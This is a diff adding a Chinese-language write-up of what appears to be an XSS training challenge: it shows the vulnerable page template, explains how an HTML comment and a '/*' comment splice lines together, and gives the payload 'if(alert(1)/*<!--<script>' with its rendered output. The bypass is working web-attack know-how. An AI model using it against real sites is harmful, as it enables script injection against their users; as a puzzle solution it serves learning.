@@ -614,3 +614,63 @@ function escape(s) {
 }
 ```
 
+
+
+随便输入点东西`"\/`
+
+```
+<script>var url = "\"\\\/"; // We'll use this later </script>
+
+  <!-- for debugging -->
+  URL: &#34;\/
+
+<!-- then suddenly -->
+<script>
+  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);
+  else new Image().src = url;
+</script>
+```
+
+可以看到有很多过滤
+
+下面有一个`*/`，可以利用这个拼接多行注释
+
+`<!--<script>`可以无视`</script>`，把这个标签后的代码全部当作js执行
+
+Payload
+
+```
+if(alert(1)/*<!--<script>
+```
+
+Output
+
+```
+<script>var url = "if(alert(1)\/*<!--<script>"; // We'll use this later </script>
+
+  <!-- for debugging -->
+  URL: if(alert(1)/*&#60;!--&#60;script&#62;
+
+<!-- then suddenly -->
+<script>
+  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);
+  else new Image().src = url;
+</script>
+
+即
+<script>var url = "if(alert(1)\/*<!--<script>"; // We'll use this later </script>
+
+  <!-- for debugging -->
+  URL: if(alert(1).test(url)) console.log("Bad url: " + url);
+  else new Image().src = url;
+</script>
+```
+
+
+
+Console output
+
+```
+Error: Uncaught TypeError: Cannot read property 'test' of undefined
+```
+
